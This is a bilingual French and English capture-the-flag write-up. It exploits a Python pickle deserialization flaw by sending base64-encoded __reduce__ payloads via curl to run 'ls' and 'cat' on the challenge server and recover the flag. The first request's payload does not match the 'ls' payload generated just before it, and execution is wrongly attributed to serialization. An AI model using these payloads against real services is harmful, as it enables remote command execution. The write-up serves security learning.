# Pickleback shot Lv1

## Write-up (français)

Ce défi consiste à utiliser le mécanisme de sérialisation avec le module `pickle` en Python afin d'extraire le contenu d'un fichier.

Dans un premier temps, nous pouvons aller voir la liste des différents fichiers disponibles dans l'environnement.

Pour lister les fichiers du dossier, nous devons écrire du code Python qui imprime, sous format base64, une classe qui, lors de sa sérialisation, exécutera une commande système permettant de lister les fichiers présents dans le dossier.

```py
import subprocess
import pickle
import base64

class ListFiles:
    def __reduce__(self):
        return (subprocess.getoutput, ('ls', ))

if __name__ == '__main__':
    pickled = pickle.dumps(ListFiles())
    print(base64.urlsafe_b64encode(pickled))
```

Ce qui donnera une chaîne en base64 représentant l'objet `ListFiles` une fois sérialisé.

La valeur obtenue sera :
```
gASVJQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMAmxzlIWUUpQu
```

Lorsque l'on envoie ces données au serveur, on reçoit la liste des fichiers.
```
curl -X GET -d "data=gASVOQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMFmNhdCBjb2NrdGFpbF9nbGFzcy50eHSUhZRSlC4=" http://<IP>:<PORT>/get_glass

app.py
cocktail_glass.txt
cup.txt
mug.txt
pilsner_glass.txt
pint_glass.txt
shot_glass.txt
```

En se demandant si un pickleback-shot serait servi dans l'un de ces verres, on peut supposer que cela devrait se trouver dans un verre à shot, en se basant sur le nom de la boisson.

Nous pouvons ensuite écrire un deuxième code pour afficher le contenu du fichier à l'aide de la fonction `cat`.

```py
import subprocess
import pickle
import base64

class ExtractGlass:
    def __reduce__(self):
        return (subprocess.getoutput, ('cat shot_glass.txt',))

if __name__ == '__main__':
    pickled = pickle.dumps(ExtractGlass())
    print(base64.urlsafe_b64encode(pickled))
```

Cela nous donne la chaîne de caractère suivante:
```
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMEmNhdCBzaG90X2dsYXNzLnR4dJSFlFKULg==
```

Ainsi, lorsque l'on envoie cette chaîne au serveur :
```
curl -X GET -d "data=gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMEmNhdCBzaG90X2dsYXNzLnR4dJSFlFKULg==" http://<IP>:<PORT>/get_glass

flag-R1p_a_Gl@ss_wIth0uT_L1quiD
```


## Write-up (english)

This challenge involves using the serialization mechanism with the `pickle` module in Python to extract the content of a file.

Firstly, we can go and see the list of different files available in the environment.

To list the files in the directory, we need to write Python code that prints, in base64 format, a class which, upon serialization, will execute a system command to list the files present in the directory.

```py
import subprocess
import pickle
import base64

class ListFiles:
    def __reduce__(self):
        return (subprocess.getoutput, ('ls', ))

if __name__ == '__main__':
    pickled = pickle.dumps(ListFiles())
    print(base64.urlsafe_b64encode(pickled))
```

This will result in a base64-encoded string representing the serialized `ListFiles` object.

The obtained value will be:
```
gASVJQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMAmxzlIWUUpQu
```

When sending these data to the server, we receive the list of files.
```
curl -X GET -d "data=gASVOQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMFmNhdCBjb2NrdGFpbF9nbGFzcy50eHSUhZRSlC4=" http://<IP>:<PORT>/get_glass

app.py
cocktail_glass.txt
cup.txt
mug.txt
pilsner_glass.txt
pint_glass.txt
shot_glass.txt
```

Wondering if a pickleback shot would be served in one of these glasses, we can assume that it should be found in a shot glass, based on the name of the drink.

We can then write a second code to display the file's content using the `cat` function.
```py
import subprocess
import pickle
import base64

class ExtractGlass:
    def __reduce__(self):
        return (subprocess.getoutput, ('cat shot_glass.txt',))

if __name__ == '__main__':
    pickled = pickle.dumps(ExtractGlass())
    print(base64.urlsafe_b64encode(pickled))
```

The obtained value will be:
```
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMEmNhdCBzaG90X2dsYXNzLnR4dJSFlFKULg==
```

Thus, when sending this string to the server:
```
curl -X GET -d "data=gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMEmNhdCBzaG90X2dsYXNzLnR4dJSFlFKULg==" http://<IP>:<PORT>/get_glass

flag-R1p_a_Gl@ss_wIth0uT_L1quiD
```

## Flag

```
flag-R1p_a_Gl@ss_wIth0uT_L1quiD
```